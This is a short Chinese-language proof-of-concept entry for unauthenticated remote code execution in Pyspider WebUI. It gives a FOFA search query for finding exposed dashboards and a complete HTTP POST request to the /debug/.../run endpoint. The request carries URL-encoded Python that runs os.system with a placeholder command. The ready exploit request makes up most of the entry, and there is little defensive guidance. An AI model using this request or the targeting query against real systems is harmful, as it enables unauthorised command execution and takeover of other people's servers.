## Pyspider-WebUI未授权访问致远程代码执行漏洞

由于Pyspider WebUI未进行合理的访问控制，默认允许远程攻击者未授权访问webui界面，且系统内部存在python脚本在线编辑并运行的模块，导致未经身份验证的攻击者可远程执行python代码调用系统命令来获取服务器权限。

## fofa

```yaml
title="Dashboard - pyspider"
```

## poc

```yaml
POST /debug/任意实例名/run HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: close
 
webdav_mode=false&script=import+os%0D%0A%0D%0Aprint%28os.system%28%27执行的命令%27%29%29&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407092258892.png)